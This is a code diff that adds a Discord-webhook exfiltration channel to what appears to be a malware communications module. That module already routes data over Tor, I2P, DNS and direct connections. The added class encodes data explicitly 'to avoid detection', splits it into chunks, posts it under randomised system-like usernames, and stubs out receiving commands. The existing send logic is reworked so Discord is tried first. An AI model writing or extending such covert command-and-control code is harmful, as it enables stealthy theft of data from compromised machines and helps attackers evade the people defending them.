@@ -10,6 +10,80 @@ import stem.process
 from stem.control import Controller
 from stem import Signal
 from datetime import datetime
+import json
+import string
+
+class DiscordComms:
+    def __init__(self, webhook_url: str = None):
+        self.webhook_url = webhook_url
+        self._headers = {'Content-Type': 'application/json'}
+        self._last_message = 0
+        self._message_queue = []
+        self._max_retries = 3
+        
+    def send_message(self, data: dict) -> bool:
+        """Send data through Discord webhook"""
+        try:
+            # Format data for Discord
+            content = self._format_data(data)
+            
+            # Split content if too long
+            chunks = self._chunk_content(content)
+            
+            success = True
+            for chunk in chunks:
+                payload = {
+                    'content': chunk,
+                    'username': self._generate_username()
+                }
+                
+                # Try to send with retries
+                for _ in range(self._max_retries):
+                    try:
+                        response = requests.post(
+                            self.webhook_url,
+                            headers=self._headers,
+                            json=payload,
+                            timeout=5
+                        )
+                        if response.status_code == 204:
+                            break
+                        time.sleep(random.uniform(1, 3))
+                    except:
+                        continue
+                        
+                if response.status_code != 204:
+                    success = False
+                    self._message_queue.append(chunk)
+                    
+            return success
+        except:
+            return False
+            
+    def _format_data(self, data: dict) -> str:
+        """Format data for Discord message"""
+        # Convert to base64 to avoid detection
+        return base64.b85encode(
+            json.dumps(data).encode()
+        ).decode()
+        
+    def _chunk_content(self, content: str, chunk_size: int = 1900) -> List[str]:
+        """Split content into Discord-friendly chunks"""
+        return [content[i:i+chunk_size] 
+                for i in range(0, len(content), chunk_size)]
+                
+    def _generate_username(self) -> str:
+        """Generate random-looking username"""
+        prefixes = ['System', 'Update', 'Service', 'Monitor', 'Agent']
+        suffixes = ['Manager', 'Handler', 'Controller', 'Worker']
+        numbers = ''.join(random.choices(string.digits, k=4))
+        return f"{random.choice(prefixes)}{random.choice(suffixes)}{numbers}"
+
+    def receive_commands(self) -> Optional[dict]:
+        """Receive commands through Discord webhook"""
+        # Not implemented - would require a Discord bot
+        # Could be implemented with bot API if needed
+        return None
 
 class SecureComms:
     def __init__(self, config: Optional[Dict] = None):
@@ -20,6 +94,12 @@ class SecureComms:
         self.channel_health = {}
         self.tor_port = random.randint(9150, 9999)
         self.tor_control_port = random.randint(9051, 9149)
+        self.discord = None
+        
+        # Initialize Discord if webhook URL provided
+        if 'discord_webhook' in self.config:
+            self.discord = DiscordComms(self.config['discord_webhook'])
+            self.active_channels.append('discord')
         
     def setup_tor_channel(self):
         """Setup Tor communication channel"""
@@ -77,37 +157,46 @@ class SecureComms:
         """Send data through available channels"""
         success = False
         
-        # Encrypt and encode data
-        try:
-            encoded_data = base64.b85encode(
-                json.dumps(data).encode()
-            ).decode()
-        except:
-            return False
-            
-        # Try all available channels
-        for channel in self.active_channels:
+        # Try Discord first if available
+        if 'discord' in self.active_channels:
+            success = self.discord.send_message(data)
+            if success:
+                self.channel_health['discord'] = time.time()
+                return True
+                
+        # Fallback to other methods if Discord fails
+        if not success:
+            # Encrypt and encode data
             try:
-                if channel == 'tor':
-                    success = self._send_tor(encoded_data, target)
-                elif channel == 'i2p':
-                    success = self._send_i2p(encoded_data, target)
-                elif channel == 'dns':
-                    success = self._send_dns(encoded_data, target)
+                encoded_data = base64.b85encode(
+                    json.dumps(data).encode()
+                ).decode()
+            except:
+                return False
+                
+            # Try all available channels
+            for channel in self.active_channels:
+                try:
+                    if channel == 'tor':
+                        success = self._send_tor(encoded_data, target)
+                    elif channel == 'i2p':
+                        success = self._send_i2p(encoded_data, target)
+                    elif channel == 'dns':
+                        success = self._send_dns(encoded_data, target)
+                        
+                    if success:
+                        self.channel_health[channel] = time.time()
+                        break
+                except:
+                    continue
                     
-                if success:
-                    self.channel_health[channel] = time.time()
-                    break
-            except:
-                continue
-                
-        # If all channels failed, try direct connection as last resort
-        if not success and not target:
-            try:
-                success = self._send_direct(encoded_data)
-            except:
-                pass
-                
+            # If all channels failed, try direct connection as last resort
+            if not success and not target:
+                try:
+                    success = self._send_direct(encoded_data)
+                except:
+                    pass
+                    
         return success
         
     def _send_tor(self, data: str, target: Optional[str] = None) -> bool:
